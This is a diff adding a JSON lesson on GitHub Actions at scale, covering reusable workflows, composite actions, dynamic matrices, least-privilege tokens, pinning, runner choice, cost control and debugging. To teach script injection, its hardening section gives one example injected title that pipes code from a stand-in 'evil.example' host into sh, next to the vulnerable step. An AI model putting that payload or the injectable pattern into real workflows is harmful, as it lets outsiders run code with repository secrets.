@@ -1,0 +1,535 @@
+{
+  "id": "expert-actions-architecture",
+  "track": "expert",
+  "title": "Actions at scale: reuse, hardening and cost",
+  "minutes": 22,
+  "summary": "Past a few workflows the questions change: how to share automation without copying it, how to keep it from becoming an attack path, and how to stop it burning hours. Reuse, least privilege and pinned dependencies answer all three.",
+  "outcomes": [
+    "Choose between a reusable workflow and a composite action for a piece of shared automation",
+    "Build a dynamic matrix from another job's output",
+    "Explain the `pull_request_target` hazard and script injection, and remove both from a workflow",
+    "Set least-privilege token permissions and pin third-party actions to a commit SHA",
+    "Cut wasted runner time with concurrency groups, timeouts, caching and path filters",
+    "Debug a failing run with debug logging, job summaries and annotations"
+  ],
+  "prereqs": ["advanced-actions-fundamentals", "advanced-ci-pipelines", "advanced-secrets-environments"],
+  "lenses": {
+    "everyday": "A restaurant group has ten kitchens. At first each one writes its own recipe for the house sauce, and after a year there are ten slightly different sauces. So headquarters writes the recipe once and every kitchen calls for it by name. That is a reusable workflow. A short prep routine that any recipe can include, such as washing and chopping, is a composite action. Ordering from a supplier by exact batch number, and not whatever is on the shelf, is pinning. Giving the dishwasher a key to the kitchen and not to the safe is least privilege. And nobody leaves the oven on overnight: every job gets a timer.",
+    "legal": "A firm stops letting every associate draft engagement letters from memory. A knowledge partner maintains one approved form, and each matter incorporates it by reference with its own party names and fee terms. That is a reusable workflow with inputs. A standard clause dropped into many documents is a composite action. Citing a standard as it stood on a specific date, and not as amended from time to time, is pinning to a commit. A limited power of attorney that covers one transaction is a least-privilege token. Running an outside party's draft under your own letterhead before anyone has read it is the `pull_request_target` mistake.",
+    "ml": "Your lab has twelve repositories, and each has a hand-copied workflow that sets up Python, restores the dataset cache, trains one epoch on a tiny sample and uploads metrics. A fix to the cache key has to be made twelve times. Move the job into one reusable workflow that takes the Python version and config path as inputs, and each repository calls it in five lines. Generate the matrix of configs from the files in `configs/`. Cancel superseded runs so a quick follow-up push does not hold a GPU runner for an hour. And never let a pull request from a stranger's fork run on the lab's self-hosted GPU machine.",
+    "technical": "A reusable workflow is a workflow file triggered by `workflow_call`. A caller references it with `uses:` at the job level and passes `with` and `secrets`, and it runs as one or more complete jobs on their own runners. A composite action is an `action.yml` whose `runs.using` is `composite`. It bundles steps and runs inside the calling job. Expressions in `${{ }}` are substituted into a script before the shell sees it, which is the injection path. The `GITHUB_TOKEN` receives the permissions the workflow declares. A workflow triggered by `pull_request_target` runs with the base repository's token and secrets, whatever the pull request contains."
+  },
+  "sections": [
+    {
+      "heading": "Two ways to reuse: workflows and composite actions",
+      "blocks": [
+        {
+          "type": "p",
+          "text": "Copying a working workflow into the next repository is how most automation spreads, and it is fine until the third copy. After that every improvement has to be applied by hand in several places, and the copies drift. GitHub Actions offers two units of reuse. They differ in what they package and where they run."
+        },
+        {
+          "type": "compare",
+          "items": [
+            {
+              "title": "Reusable workflow",
+              "points": [
+                "Packages whole jobs, each on its own runner",
+                "Called at the job level with `uses:` and the path to a workflow file",
+                "Receives `inputs` and named `secrets` from the caller",
+                "Best for a complete pipeline that every repository should run the same way"
+              ]
+            },
+            {
+              "title": "Composite action",
+              "points": [
+                "Packages a sequence of steps",
+                "Called as one step inside any job",
+                "Receives `inputs` only, and shares the job's runner, files and environment",
+                "Best for setup or housekeeping that several different jobs repeat"
+              ]
+            }
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "yaml",
+          "file": ".github/workflows/python-ci.yml",
+          "code": "name: Python CI (reusable)\n\non:\n  workflow_call:\n    inputs:\n      python-version:\n        type: string\n        default: \"3.13\"\n      config:\n        type: string\n        required: true\n    secrets:\n      DATA_TOKEN:\n        required: false\n\npermissions:\n  contents: read\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 20\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-python@v7\n        with:\n          python-version: ${{ inputs.python-version }}\n          cache: pip\n      - run: pip install -r requirements.txt\n      - run: python train.py --config \"$CONFIG\" --smoke-test\n        env:\n          CONFIG: ${{ inputs.config }}\n          DATA_TOKEN: ${{ secrets.DATA_TOKEN }}",
+          "caption": "The shared pipeline, defined once in a templates repository"
+        },
+        {
+          "type": "code",
+          "lang": "yaml",
+          "file": ".github/workflows/ci.yml",
+          "code": "name: CI\n\non:\n  pull_request:\n  push:\n    branches: [main]\n\njobs:\n  smoke:\n    uses: my-lab/ci-templates/.github/workflows/python-ci.yml@v2\n    with:\n      config: configs/baseline.yaml\n    secrets:\n      DATA_TOKEN: ${{ secrets.DATA_TOKEN }}",
+          "caption": "A caller in another repository. Five lines replace the whole job."
+        },
+        {
+          "type": "code",
+          "lang": "yaml",
+          "file": ".github/actions/setup-env/action.yml",
+          "code": "name: Set up environment\ndescription: Install Python and project dependencies\ninputs:\n  python-version:\n    description: Python version to install\n    default: \"3.13\"\nruns:\n  using: composite\n  steps:\n    - uses: actions/setup-python@v7\n      with:\n        python-version: ${{ inputs.python-version }}\n        cache: pip\n    - run: pip install -r requirements.txt\n      shell: bash",
+          "caption": "A composite action. Every run step must name its shell."
+        },
+        {
+          "type": "callout",
+          "kind": "note",
+          "title": "Name the secrets you pass",
+          "text": "`secrets: inherit` hands a called workflow every secret the caller can see. It is convenient inside one organization and too broad for anything you do not control. Passing named secrets documents exactly what the called workflow needs."
+        }
+      ]
+    },
+    {
+      "heading": "Matrices, outputs and dynamic fan-out",
+      "blocks": [
+        {
+          "type": "p",
+          "text": "A matrix runs one job definition across combinations of values. `include` adds or extends specific combinations and `exclude` removes them. When the list is not known in advance, one job can compute it and hand it to the next job as JSON."
+        },
+        {
+          "type": "code",
+          "lang": "yaml",
+          "code": "jobs:\n  plan:\n    runs-on: ubuntu-latest\n    outputs:\n      configs: ${{ steps.list.outputs.configs }}\n    steps:\n      - uses: actions/checkout@v7\n      - id: list\n        run: |\n          configs=$(ls configs/*.yaml | jq -R . | jq -sc .)\n          echo \"configs=$configs\" >> \"$GITHUB_OUTPUT\"\n\n  smoke:\n    needs: plan\n    if: needs.plan.outputs.configs != '[]'\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    strategy:\n      fail-fast: false\n      max-parallel: 4\n      matrix:\n        config: ${{ fromJSON(needs.plan.outputs.configs) }}\n    steps:\n      - uses: actions/checkout@v7\n      - run: python train.py --config \"$CONFIG\" --smoke-test\n        env:\n          CONFIG: ${{ matrix.config }}",
+          "caption": "The plan job lists the config files. The smoke job fans out over them."
+        },
+        {
+          "type": "list",
+          "items": [
+            "`fail-fast: false` lets every combination finish, so you see all the failures and not only the first.",
+            "`max-parallel` caps how many combinations run at once, which protects a shared service or a small pool of runners.",
+            "Job outputs are strings. Serialize lists and objects as JSON and decode them with `fromJSON`.",
+            "A matrix multiplies cost. Six Python versions on three operating systems is eighteen jobs on every push."
+          ]
+        },
+        {
+          "type": "reveal",
+          "prompt": "Delete the `if:` line from the `smoke` job. The `plan` job then finds no files and outputs the empty list `[]`. What happens to the run?",
+          "answer": "It fails. A matrix dimension with no values is an error, not zero jobs. The job-level `if:` guards the fan-out by skipping `smoke` when there is nothing to do. The alternative is to make the plan job fail with a clear message when it finds no configs."
+        }
+      ]
+    },
+    {
+      "heading": "Hardening: treat the workflow as an attack surface",
+      "blocks": [
+        {
+          "type": "p",
+          "text": "A workflow is code that runs with a token to your repository and, often, with secrets. Anyone who can influence what it executes, or what text it interpolates, can borrow that authority. Five controls cover most of the risk."
+        },
+        {
+          "type": "table",
+          "head": ["Threat", "How it happens", "Control"],
+          "rows": [
+            ["A dependency changes under you", "An action referenced by a tag such as `@v3` is re-pointed at different code", "Pin third-party actions to a full commit SHA and let Dependabot propose updates"],
+            ["An over-powered token", "The job's `GITHUB_TOKEN` can write when the job only needs to read", "Declare `permissions:` at the top with read access, then grant more per job"],
+            ["Script injection", "Text an outsider controls, such as a pull request title, is pasted into a `run` script by an expression", "Pass the value through `env:` and quote the shell variable"],
+            ["Untrusted code with trusted credentials", "A `pull_request_target` workflow checks out and runs the pull request's code", "Never build or execute pull request code under that trigger"],
+            ["Long-lived cloud keys", "A static key stored as a secret leaks, or outlives the person who made it", "Use OpenID Connect so the cloud issues a short-lived credential per run"]
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "yaml",
+          "code": "# Vulnerable: the title becomes part of the script before bash runs.\n# A title such as  a\"; curl https://evil.example/x | sh; \"  would execute.\n- run: echo \"Checking ${{ github.event.pull_request.title }}\"\n\n# Safe: the expression lands in an environment variable.\n# The shell treats the variable as data, never as code.\n- run: echo \"Checking $PR_TITLE\"\n  env:\n    PR_TITLE: ${{ github.event.pull_request.title }}",
+          "caption": "The same step, injectable and fixed"
+        },
+        {
+          "type": "callout",
+          "kind": "danger",
+          "title": "pull_request_target runs with your keys",
+          "text": "A `pull_request` run from a fork gets a read-only token and no secrets, which is why it is safe to build a stranger's code there. `pull_request_target` exists for labeling and commenting, so it runs the *base* branch's workflow with the repository's token and secrets. If that workflow checks out the pull request head and runs its build, tests or install scripts, the stranger's code runs with your credentials."
+        },
+        {
+          "type": "code",
+          "lang": "yaml",
+          "code": "permissions:\n  contents: read          # default for every job in this file\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    permissions:\n      contents: read\n      id-token: write     # lets this job request an OIDC token\n    steps:\n      - uses: actions/checkout@v7\n      - uses: some-org/cloud-login@<full-40-character-commit-sha>   # v3.2.1",
+          "caption": "Least privilege by default, one job elevated, one third-party action pinned"
+        },
+        {
+          "type": "callout",
+          "kind": "law",
+          "title": "Controls an auditor can read",
+          "text": "Pinned versions, declared permissions and required reviewers on a deployment environment are segregation of duties written in a file. The history shows who changed a control and who approved the change. If your work is audited, protect workflow files with a CODEOWNERS entry so that a change to the pipeline needs a second person."
+        }
+      ]
+    },
+    {
+      "heading": "Runners: hosted, larger and self-hosted",
+      "blocks": [
+        {
+          "type": "compare",
+          "items": [
+            {
+              "title": "GitHub-hosted",
+              "points": [
+                "A fresh virtual machine for every job, discarded afterward",
+                "No maintenance, and nothing persists between runs",
+                "The safe default for public repositories and untrusted pull requests"
+              ]
+            },
+            {
+              "title": "Self-hosted",
+              "points": [
+                "Your machine, your network and your hardware, such as GPUs",
+                "State can persist between jobs unless you make the runner ephemeral",
+                "You patch it, isolate it and decide which repositories may target it"
+              ]
+            }
+          ]
+        },
+        {
+          "type": "callout",
+          "kind": "warn",
+          "title": "Keep self-hosted runners away from public pull requests",
+          "text": "A pull request from a fork can change the workflow's steps. On a self-hosted runner those steps execute on your machine, inside your network, and can leave something behind for the next job. GitHub's guidance is to avoid self-hosted runners on public repositories. For private work, prefer ephemeral runners and restrict them to specific repositories with runner groups where your plan offers them."
+        },
+        {
+          "type": "p",
+          "text": "Larger hosted runners and GPU runners exist for heavier jobs. Availability and billing depend on your plan, so read the documentation before you design around them."
+        }
+      ]
+    },
+    {
+      "heading": "Cost and time",
+      "blocks": [
+        {
+          "type": "list",
+          "items": [
+            "**Cancel what is superseded.** A `concurrency` group keyed on the branch with `cancel-in-progress: true` stops the old run when a new push arrives. Leave cancellation off for deployments, where a half-finished run is worse than a slow one.",
+            "**Set `timeout-minutes` on every job.** The default limit is measured in hours, and a hung test will use all of it.",
+            "**Cache what is expensive to rebuild**, and key the cache on a hash of the lock file so a dependency change produces a fresh cache.",
+            "**Filter by path** so a documentation change does not run the training smoke test.",
+            "**Split fast from slow.** Run lint and unit tests on every push, and the long integration job on a schedule or a label."
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "yaml",
+          "code": "concurrency:\n  group: ci-${{ github.ref }}\n  cancel-in-progress: true\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/cache@v6\n        with:\n          path: ~/.cache/pip\n          key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}",
+          "caption": "One run per branch, a hard stop at fifteen minutes, and a cache that follows the dependency file"
+        },
+        {
+          "type": "callout",
+          "kind": "note",
+          "title": "Path filters and required checks do not mix well",
+          "text": "When a path filter skips a whole workflow, its checks are never reported. If one of them is a required check, the pull request waits forever. Keep required workflows unfiltered and decide inside the job whether there is work to do, or make one always-running job the required check. See [Guardrails](#advanced-branch-protection)."
+        }
+      ]
+    },
+    {
+      "heading": "Debugging what you cannot see",
+      "blocks": [
+        {
+          "type": "list",
+          "items": [
+            "Re-run the failed jobs with debug logging turned on. The log then includes each step's expanded inputs and internal commands.",
+            "Write a **job summary**. Markdown appended to the file named by `$GITHUB_STEP_SUMMARY` appears on the run's summary page. Use it for metric tables.",
+            "Emit **annotations** with workflow commands. They attach an error, a warning or a notice to a file and line in the pull request.",
+            "Read the **Set up job** step. It lists the runner image and the exact permissions the token received.",
+            "Query logs from a terminal when the web view truncates long output."
+          ]
+        },
+        {
+          "type": "code",
+          "lang": "bash",
+          "code": "# A results table on the run summary page\n{\n  echo \"### Smoke test\"\n  echo \"| config | loss |\"\n  echo \"|---|---|\"\n  echo \"| baseline | $LOSS |\"\n} >> \"$GITHUB_STEP_SUMMARY\"\n\n# An annotation on a specific line of a file\necho \"::warning file=train.py,line=88::Learning rate is outside the tested range\"",
+          "caption": "Two outputs a reviewer sees without opening the log"
+        },
+        {
+          "type": "callout",
+          "kind": "a11y",
+          "title": "Logs that everyone can read",
+          "text": "Long colored logs are hard to scan, and color alone carries no meaning for a screen reader or for many color-blind readers. Put the conclusion in a job summary as plain text with a table, group noisy output between `::group::` and `::endgroup::`, and state failures in words."
+        }
+      ]
+    }
+  ],
+  "howto": [
+    {
+      "task": "Move a duplicated job into a reusable workflow",
+      "browser": [
+        "In the repository that will hold shared workflows, select **Add file**, then **Create new file**, and name it `.github/workflows/python-ci.yml`.",
+        "Paste the job, replace its trigger with `on: workflow_call:`, and declare the `inputs` and `secrets` it needs. Commit to a branch and open a pull request.",
+        "If callers live in other private repositories, open **Settings**, then **Actions**, then **General**, and allow access from your other repositories in the **Access** section.",
+        "In a calling repository, edit its workflow so the job is a `uses:` line with the owner, repository, file path and a ref.",
+        "Open the **Actions** tab and confirm the run shows the called workflow's jobs nested under the caller."
+      ],
+      "phone": [
+        "Workflow YAML is sensitive to indentation and awkward to write on a phone keyboard. Author it at a computer or in a Codespace.",
+        "Use GitHub Mobile to watch the result: open the repository, open **Actions**, and select the run to see each job and its log."
+      ],
+      "cli": [
+        "`git switch -c ci/reusable-python` in the repository that holds shared workflows.",
+        "Create `.github/workflows/python-ci.yml` with the `workflow_call` trigger, then `git add`, `git commit` and `git push -u origin ci/reusable-python`.",
+        "`gh pr create --fill`, then merge after review. Tag the merged commit, for example `git tag v2` and `git push origin v2`, so callers have a stable ref.",
+        "In a calling repository, replace the job body with the `uses:` line, commit and push.",
+        "`gh run watch` follows the run. `gh run view --log-failed` prints only the failing step if it breaks."
+      ],
+      "editor": [
+        "Install the GitHub Actions extension for VS Code. It validates workflow syntax as you type and lists runs in a side panel.",
+        "Create the reusable workflow file and let the extension flag unknown keys before you commit.",
+        "With a coding agent, ask it to extract the duplicated job into a reusable workflow and update each caller. Review the diff for widened permissions or `secrets: inherit`, and run it on a branch before merging."
+      ]
+    },
+    {
+      "task": "Re-run a failed job with debug logging",
+      "browser": [
+        "Open the **Actions** tab and select the failed run.",
+        "Select **Re-run jobs**, then **Re-run failed jobs**.",
+        "Tick **Enable debug logging** in the dialog and confirm.",
+        "Open the failing step. The added debug lines show expanded inputs and internal commands."
+      ],
+      "phone": [
+        "In GitHub Mobile, open the run from **Actions** and read the failing step's log.",
+        "The app can re-run a workflow as of this writing, but it may not offer the debug option. For that, open the run in your phone's browser and switch to the desktop site."
+      ],
+      "cli": [
+        "`gh run list --limit 5` to find the run ID.",
+        "`gh run view <run-id> --log-failed` to read the failing step first.",
+        "`gh run rerun <run-id> --failed --debug` to re-run only the failed jobs with debug logging.",
+        "`gh run watch <run-id>` to follow it to the end."
+      ],
+      "editor": [
+        "In VS Code, open the run from the GitHub Actions extension's panel to read its log beside the workflow file.",
+        "Run the `gh run rerun` command from the integrated terminal to turn on debug logging.",
+        "If you hand the failure to a coding agent, give it the output of `gh run view --log-failed` and ask for the cause before you ask for a fix."
+      ]
+    },
+    {
+      "task": "Pin a third-party action to a commit SHA",
+      "browser": [
+        "Open the action's repository and select **Releases** or the list of tags.",
+        "Select the release you have reviewed, then select its commit to open the commit page.",
+        "Copy the full 40-character commit ID from the page or from its address.",
+        "In your workflow, replace the tag after `@` with that ID and add the version as a comment, for example `# v3.2.1`.",
+        "Confirm the commit page belongs to the action's own repository and not to a fork of it."
+      ],
+      "phone": [
+        "You can look up a release's commit ID in a mobile browser, but a 40-character value is error-prone to copy on a phone. Make the edit at a computer.",
+        "Once pins exist, Dependabot's update pull requests are comfortable to review and merge in GitHub Mobile."
+      ],
+      "cli": [
+        "`gh api repos/OWNER/REPO/commits/v3.2.1 --jq .sha` prints the commit a tag resolves to, for annotated and lightweight tags alike.",
+        "Edit the workflow so the line reads `uses: OWNER/REPO@` followed by the full ID, with `# v3.2.1` at the end.",
+        "`git diff` to check the change, then commit and open a pull request.",
+        "Add the `github-actions` ecosystem to `.github/dependabot.yml` so pinned IDs receive update pull requests."
+      ],
+      "editor": [
+        "Edit the workflow file and replace each third-party tag with a full commit ID and a version comment.",
+        "With a coding agent, ask it to pin every third-party action and list the tag each ID came from. Spot-check two of them with the `gh api` command before you merge."
+      ]
+    }
+  ],
+  "pitfalls": [
+    {
+      "trap": "Using `pull_request_target` to get secrets into a pull request build, then checking out the pull request's code.",
+      "fix": "Build untrusted code with `pull_request`, which has no secrets. Keep `pull_request_target` for jobs that only label or comment and never execute the contributor's files."
+    },
+    {
+      "trap": "Interpolating `github.event` values such as titles, branch names or comment bodies straight into a `run` script.",
+      "fix": "Assign the expression to an `env:` variable and reference the quoted shell variable in the script."
+    },
+    {
+      "trap": "Referencing a third-party action by a tag, or by a branch such as `@main`.",
+      "fix": "Pin to a full commit SHA with the version in a comment, and let Dependabot propose updates."
+    },
+    {
+      "trap": "Adding a path filter to a workflow whose check is required. Pull requests then wait on a check that never reports.",
+      "fix": "Leave required workflows unfiltered and skip the work inside the job, or make one always-running job the required check."
+    },
+    {
+      "trap": "Turning on `cancel-in-progress` for a deployment workflow.",
+      "fix": "Put deployments in a concurrency group so they queue, and leave cancellation off. A release should finish or fail, not stop halfway."
+    },
+    {
+      "trap": "Registering a self-hosted runner on a public repository to get more compute.",
+      "fix": "Use hosted runners for public work. Keep self-hosted runners for private repositories, and make them ephemeral where you can."
+    }
+  ],
+  "quiz": [
+    {
+      "q": "Six different jobs across your repositories each begin with the same four setup steps. What is the right unit of reuse?",
+      "choices": [
+        "A reusable workflow, because it is called with `uses:`",
+        "A composite action, because it packages steps that run inside any job",
+        "A matrix, because the steps repeat",
+        "A required status check"
+      ],
+      "answer": 1,
+      "why": "The repeated thing is a group of steps inside otherwise different jobs, which is what a composite action packages. A reusable workflow replaces whole jobs and runs on its own runner, so it cannot prepare the environment for steps that follow in the caller's job."
+    },
+    {
+      "q": "Why is `uses: some-org/tool@v3` weaker than a full commit SHA?",
+      "choices": [
+        "Tags are slower for the runner to resolve",
+        "Tags cannot be used across organizations",
+        "The Marketplace requires a SHA",
+        "A tag can be moved to different code, and a commit ID cannot"
+      ],
+      "answer": 3,
+      "why": "A tag is a movable pointer controlled by whoever can push to that repository, including an attacker who compromises it. A commit ID names exact content. Pinning turns a silent change into a pull request you can review."
+    },
+    {
+      "q": "A step contains `run: echo \"${{ github.event.issue.title }}\"`. What is the risk?",
+      "choices": [
+        "The title is substituted into the script before the shell runs, so a crafted title can execute commands",
+        "Issue titles are treated as secrets and will be masked",
+        "Nothing, because the value sits inside double quotes",
+        "The expression fails on long titles"
+      ],
+      "answer": 0,
+      "why": "The runner expands expressions into the script text first. Quotes in the YAML do not help, because the attacker's title can close them. Passing the value through `env:` makes the shell treat it as data."
+    },
+    {
+      "q": "What makes `pull_request_target` dangerous when the workflow checks out the pull request head and runs its tests?",
+      "choices": [
+        "The tests run twice",
+        "The run cannot be cancelled",
+        "The contributor's code executes with the base repository's token and secrets",
+        "It turns off branch protection"
+      ],
+      "answer": 2,
+      "why": "That trigger deliberately grants the base repository's credentials so maintainers can label and comment on pull requests from forks. Running the fork's code in the same job hands those credentials to whoever wrote the code."
+    },
+    {
+      "q": "After you add `paths: ['src/**']` to a required workflow, a documentation-only pull request shows the check as expected and it never finishes. Why?",
+      "choices": [
+        "The runner queue is full",
+        "The workflow was skipped, so the required check is never reported",
+        "Path filters disable required checks",
+        "Documentation changes need an administrator's approval"
+      ],
+      "answer": 1,
+      "why": "A skipped workflow reports nothing, and branch protection keeps waiting for a result that will not arrive. Run the workflow unconditionally and skip the work inside the job, so a result is always reported."
+    }
+  ],
+  "mission": {
+    "title": "Harden one workflow you already run",
+    "where": "Any workflow in your repository, changed on a branch and proposed as a pull request.",
+    "steps": [
+      "Add a top-level `permissions:` block with `contents: read`. Grant anything more only on the job that needs it.",
+      "Add `timeout-minutes` to every job, set a little above its normal duration.",
+      "Add a `concurrency` group keyed on `github.ref` so superseded pull request runs are cancelled. Skip this for a deploy job.",
+      "Search the file for `github.event` inside `run:` steps and move each one into an `env:` variable.",
+      "Pin one third-party action to a full commit SHA with the version in a comment.",
+      "Open a pull request. In the run's **Set up job** step, read the token permissions and confirm they match what you declared."
+    ]
+  },
+  "terms": [
+    {
+      "term": "reusable workflow",
+      "def": "A workflow triggered by `workflow_call` that other workflows run as a complete job by referencing its file with `uses:`."
+    },
+    {
+      "term": "composite action",
+      "def": "An action defined in an `action.yml` file that bundles several steps and runs as a single step inside the calling job."
+    },
+    {
+      "term": "dynamic matrix",
+      "def": "A matrix whose values are computed by an earlier job, passed as a JSON string output and decoded with `fromJSON`."
+    },
+    {
+      "term": "script injection",
+      "def": "An attack where text an outsider controls is interpolated into a workflow script through an expression and runs as code."
+    },
+    {
+      "term": "pull_request_target",
+      "def": "A trigger that runs the base branch's workflow with the base repository's token and secrets. It is intended for labeling and commenting on pull requests from forks."
+    },
+    {
+      "term": "OpenID Connect",
+      "def": "A way for a workflow run to prove its identity to a cloud provider and receive a short-lived credential, so no long-lived key is stored as a secret."
+    },
+    {
+      "term": "ephemeral runner",
+      "def": "A self-hosted runner that accepts one job and is then discarded, so nothing persists from one job to the next."
+    },
+    {
+      "term": "concurrency group",
+      "def": "A named lane for workflow runs. Only one run in a group proceeds at a time, and a newer run can cancel an older one."
+    }
+  ],
+  "commands": [
+    {
+      "cmd": "gh workflow list",
+      "does": "Lists the workflows in the repository and whether each is enabled.",
+      "kind": "gh",
+      "risk": "safe"
+    },
+    {
+      "cmd": "gh workflow run <file> --ref <branch>",
+      "does": "Starts a workflow that has a `workflow_dispatch` trigger, on the given branch.",
+      "kind": "gh",
+      "risk": "caution"
+    },
+    {
+      "cmd": "gh run list --workflow <file> --limit 10",
+      "does": "Lists recent runs of one workflow with their status and IDs.",
+      "kind": "gh",
+      "risk": "safe"
+    },
+    {
+      "cmd": "gh run view <run-id> --log-failed",
+      "does": "Prints the log of only the steps that failed.",
+      "kind": "gh",
+      "risk": "safe"
+    },
+    {
+      "cmd": "gh run rerun <run-id> --failed --debug",
+      "does": "Re-runs the failed jobs of a run with debug logging turned on.",
+      "kind": "gh",
+      "risk": "caution"
+    },
+    {
+      "cmd": "gh run watch <run-id>",
+      "does": "Follows a run in the terminal until it finishes.",
+      "kind": "gh",
+      "risk": "safe"
+    },
+    {
+      "cmd": "gh api repos/OWNER/REPO/commits/<tag> --jq .sha",
+      "does": "Prints the full commit ID a tag resolves to, ready for pinning an action.",
+      "kind": "gh",
+      "risk": "safe"
+    },
+    {
+      "cmd": "gh cache list",
+      "does": "Lists the Actions caches stored for the repository, with their keys and sizes.",
+      "kind": "gh",
+      "risk": "safe"
+    },
+    {
+      "cmd": "echo \"name=value\" >> \"$GITHUB_OUTPUT\"",
+      "does": "Inside a step, sets a step output that later steps and jobs can read.",
+      "kind": "shell",
+      "risk": "safe"
+    },
+    {
+      "cmd": "echo \"### Result\" >> \"$GITHUB_STEP_SUMMARY\"",
+      "does": "Inside a step, appends Markdown to the run's summary page.",
+      "kind": "shell",
+      "risk": "safe"
+    }
+  ],
+  "links": [
+    {
+      "label": "GitHub Docs: Reusing workflows",
+      "url": "https://docs.github.com/en/actions/using-workflows/reusing-workflows"
+    },
+    {
+      "label": "GitHub Docs: Creating a composite action",
+      "url": "https://docs.github.com/en/actions/creating-actions/creating-a-composite-action"
+    },
+    {
+      "label": "GitHub Docs: Security hardening for GitHub Actions",
+      "url": "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+    },
+    {
+      "label": "GitHub Docs: About security hardening with OpenID Connect",
+      "url": "https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect"
+    },
+    {
+      "label": "GitHub Security Lab: Preventing pwn requests",
+      "url": "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
+    }
+  ]
+}
